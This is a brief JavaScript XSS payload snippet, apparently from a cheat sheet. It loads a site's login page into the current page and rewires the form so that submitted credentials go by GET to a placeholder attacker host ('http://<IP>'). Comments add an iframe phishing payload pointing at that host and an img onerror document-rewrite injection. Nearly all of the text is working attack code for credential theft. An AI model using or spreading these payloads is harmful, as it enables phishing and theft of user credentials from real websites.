fetch("login").then(res => res.text().then(data => {
        document.getElementsByTagName("html")[0].innerHTML = data
        document.getElementsByTagName("form")[0].action = "http://<IP>" 
        document.getElementsByTagName("form")[0].method = "get"
}))



//iframes are also good for phishing:
//<iframe src=//<IP>/p.html>

//img tags:
//<img src=x onerror="document.write('<HTML>')">
